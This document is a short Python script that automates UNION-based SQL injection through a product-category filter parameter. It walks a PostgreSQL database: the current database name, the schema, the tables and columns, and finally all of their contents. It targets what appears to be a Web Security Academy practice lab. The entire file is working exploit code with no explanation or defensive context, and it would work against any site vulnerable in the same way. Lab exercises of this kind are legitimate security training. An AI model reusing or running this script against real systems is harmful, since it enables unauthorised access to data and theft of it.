#!/usr/bin/python3
##
import requests
import re
import pwn
##
Payload1="/filter?category='+UNION+SELECT+NULL,CAST("
#
def get_current_db(URL):
    padding="current_database()"
    Payload2="as+varchar)--+-"
    send=URL+Payload1+padding+Payload2
    r=requests.get(send)
    db=str(re.findall("td.*", r.text)).split('>')[1].split('<')[0]
    return db
##
def get_current_schema(URL):
    padding="current_schema()"
    Payload2="as+varchar)--+-"
    send=URL+Payload1+padding+Payload2
    r=requests.get(send)
    db=str(re.findall("td.*", r.text)).split('>')[1].split('<')[0]
    return db
##
def get_tables(URL,schema):
    padding=f"table_name+as+varchar)+from+information_schema.tables+WHERE+table_schema+%3d+'{schema}'--+-"
    send=URL+Payload1+padding
    r=requests.get(send)
    tb=[]
    for X in(re.findall("td.*", r.text)):
        tb.append(X.split('>')[1].split('<')[0])
    return tb
##
def get_columns(URL,table,schema):
    padding=f"COLUMN_NAME+as+varchar)+from+information_schema.columns+where+table_name%3d'{table}'--+-"
    send=URL+Payload1+padding
    r=requests.get(send)
    cols=[]
    for X in (re.findall("td.*", r.text)):
        cols.append(X.split('>')[1].split('<')[0] )
    return cols
##
def get_data(URL,col,table):
    padding=f"{col}+as+varchar)+from+{table}--+-"
    send=URL+Payload1+padding
    r=requests.get(send)
    dat=[]
    for X in (re.findall("td.*", r.text)):
        dat.append(X.split('>')[1].split('<')[0] )
    return dat
##
def main(URL):
    db=get_current_db(URL)
    print(f"Databse: {db}")
    #
    schema=get_current_schema(URL)
    print(f"Schema: {schema}")
    #
    tables=get_tables(URL,schema)
    print(f"Tables: {tables}")
    #
    for X in tables:
        print(f"For table {X}:")
        tmp=get_columns(URL,X,schema)
        print(tmp)
        for Y in tmp:
            print(f"Table: {X} and column {Y}")
            data=get_data(URL,Y,X)
            print(data)
##
main("https://0a2400b7041a30d080daeeeb00a400d1.web-security-academy.net")
